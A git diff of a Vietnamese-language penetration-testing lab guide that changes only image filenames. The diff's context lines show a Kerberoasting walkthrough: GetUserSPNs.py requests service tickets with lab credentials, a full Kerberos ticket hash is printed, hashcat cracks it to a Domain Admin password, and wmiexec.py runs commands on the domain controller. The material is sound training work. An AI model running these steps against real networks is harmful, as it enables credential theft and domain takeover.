@@ -5930,7 +5930,7 @@ Các máy ảo được sử dụng:
 
 Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
 
-![alt text](IMG/LAB5/LAB5.1/imagE.png)
+![alt text](IMG/LAB5/LAB5.1/image.png)
 
 Trong trường hợp bạn đã chạy bài thực hành này trước đây, hãy cùng nhau dọn dẹp một chút. Chúng ta hãy xóa các tệp pot của JtR và Hashcat.
 
@@ -5947,7 +5947,7 @@ Chúng ta đã có được một bộ thông tin đăng nhập miền hợp l�
 
 Chú ý, chúng ta cần cấu hình DNS:
 
-![alt text](IMG/LAB5/LAB5.1/imagE-2.png)
+![alt text](IMG/LAB5/LAB5.1/image-2.png)
 
 Bước đầu tiên, chúng ta sẽ sử dụng tập lệnh Python GetUserSPNs.py, tập lệnh này sẽ thực hiện các bước sau:
 
@@ -5969,7 +5969,7 @@ Chúng ta sẽ sử dụng `GetUserSPNs.py` thư viện impacket. Chúng ta cầ
 GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.10 | tee /tmp/spns.output
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-1.png)
+![alt text](IMG/LAB5/LAB5.1/image-1.png)
 
 ```bash
 $krb5tgs$23$*SVC_SQLService2$HIBOXY.COM$hiboxy.com/SVC_SQLService2*$c0c7991bffbefc7f00fe182aa426c0b4$81a097ceb9104845d89e32fda6cfd1f2254cac6ee7f6c7db0e998d39448f143fa8ac0f626addeec662eb91782ab35e2de6c4f8b47072981aa5957fda860aa2c988d18b5affc0db35de09b32de1930c0ebf50316ed33cac7b2725b54753fcd4b43b18c6cef272d0b416aa16af3ce03719346b5edfdfbda48291868d61040e0ea27d93fc8738edd09d31d48ca37b6132c4f2c417d9278af3e8823c16836468881ac4f7d3a442ffdd8ecea5e86014d3a97b2cac7ab87e82328e16c45b1e9b99c1e7c407f1c808faf2394e40de4aceb3a426ecec46e357c92e6200f8f220091db36697de0959c12ef443ace8e9edfc5d3b04f301be03c84f69bcfc1ab1171dffc29711789de3e3115e99cc817e705d5df90abb167e64f8da9443b2e51b3bce5522da0c74b89133c5379792ca77938817369b454a4c8ad5fe07738257764f1a312989b8428107058f50171d279b59281e2755b09924ca5b1921a794fd1e876f20516de565ef371fbba6771d6b60e1e1c062a11f945c0835538ce4f034ff34334ceda6da9470a260a16162f31fcad03dc98203bed9309995932e92405aaa6e540de6ac11f89688e63d8e6fa59b0ea5ccc840e7c5b127b36d3ba638a1802e9976b57ed2ea8c741e4d5323cb2dba12009c302ce6a8f087fd295bb8c182101af22d448faff511031a5672c1db2b68d560575f6778192a54d0984e22f654bbde50ce3b6e0d4caf038bf2a07303691a756de95751f1e5a0059293a87000028d791fe7d4fc65ec03c9fd8153a608e86d55422d80bdf109900900830e2e334d6717e219c3195ff27e9a74b29f1f2390d086593e87e07cf8003b272e36bd39447e9b6fc1b796abd0407f187a17e9f1a43b2981e70699a0f83628b075fb7d101b399b047022f147effd87ecf883988660fe484981323c498a28f85247a5b51a79048619c451bd5bbbe0dda9cbc298f7ec8c252540070ecd89fc6a3fc1491adcf6d1c411df4c96fcb7fae44356ade9904ce34fcccd90324cf1ce6a3039c2ea7c91c235f596a4d43e771d8e24a58141a82838a43c2778871563c4fae6e7d78a73c06e319599c44a9c0cfff0e728510c0b6d2d42b342581e9f2306c39a8975f05c7059639f8e22764a6882d364e412262f7d5db8473673756a007b8e092b4c705e5ea985788368ea17eb67e6c1d22753b08b4c137bb99a206324ceebef64028cf912b36c7fc33de69a67c504401496ec1441a5685afd714dfa4ce0fd108f37672b504e36ce362e5e2bf3ec3e745ec05f17f991339e87a94f88c1cb3f17fa9b68c8029745e8d36fd4c4c3ab8bb873f101f25a379a747344296fda03d227fc67e46bd37eb107f5ee685cbea1fcbb6ba725f11e9b3459ac00ab71a1778cb5a4963a0dd6a68e3f3fa92d237557f8fb607c6cc9f8f2a9704ef7d7e5bb2786f947aa75ac3097b0d3c12d5d39b5c56ed30dce7296be
@@ -6016,7 +6016,7 @@ Chúng ta hãy sử dụng các từ trong từ điển tiếng Anh và thêm m�
 hashcat -m 13100 -a 6 /tmp/tickets /opt/passwords/english-dictionary-capitalized.txt ?d
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-3.png)
+![alt text](IMG/LAB5/LAB5.1/image-3.png)
 
 Quá trình này sẽ chạy trong khoảng một phút, sau đó sẽ hiển thị mật khẩu của `Supercool7`.
 
@@ -6032,7 +6032,7 @@ hashcat -m 13100 -a 7 /tmp/tickets ?s /opt/passwords/english-dictionary-capitali
 
 Chúng tôi đã tìm thấy mật khẩu cho `SVC_SQLService2` tài khoản đó, và như bạn đã nhớ ở trên, đó là tài khoản của thành viên nhóm Quản trị viên tên miền!
 
-![alt text](IMG/LAB5/LAB5.1/imagE-4.png)
+![alt text](IMG/LAB5/LAB5.1/image-4.png)
 
 ### 4. Sử dụng thông tin đăng nhập bị đánh cắp
 
@@ -6066,7 +6066,7 @@ Chạy tập `wmiexec.py` lệnh bằng `whoami` lệnh:
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 whoami
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-5.png)
+![alt text](IMG/LAB5/LAB5.1/image-5.png)
 
 Tiếp theo, chúng ta có thể xác nhận mình đang ở trên Bộ điều khiển miền với tư cách là `svcsqlserver` tài khoản bằng cách sử dụng `hostname` lệnh. Chỉ cần nhấn phím mũi tên lên và thay thế `whoami` bằng `hostname`.
 
@@ -6074,7 +6074,7 @@ Tiếp theo, chúng ta có thể xác nhận mình đang ở trên Bộ điều 
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 hostname
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-6.png)
+![alt text](IMG/LAB5/LAB5.1/image-6.png)
 
 Bây giờ chúng ta hãy chạy net `user` lệnh. Thay vì gõ lại lệnh trước đó, hãy nhấn phím mũi tên lên để quay lại lệnh trước đó, sau đó dùng phím xóa (hoặc `Ctrl+W` để xóa cả một từ) để xóa `hostname` và gõ lại `net user`.
 
@@ -6084,7 +6084,7 @@ Chạy lệnh `wmiexec.py` này `net user` để lấy danh sách người dùng
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-7.png)
+![alt text](IMG/LAB5/LAB5.1/image-7.png)
 
 Cuối cùng, chúng ta có thể chạy net `user` lệnh để xem nó `svcsqlserver` là thành viên của những nhóm nào:
 
@@ -6092,7 +6092,7 @@ Cuối cùng, chúng ta có thể chạy net `user` lệnh để xem nó `svcsql
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user SVC_SQLService2
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-8.png)
+![alt text](IMG/LAB5/LAB5.1/image-8.png)
 
 Một trong những nhóm đó là nhóm "Quản trị viên tên miền"!
 
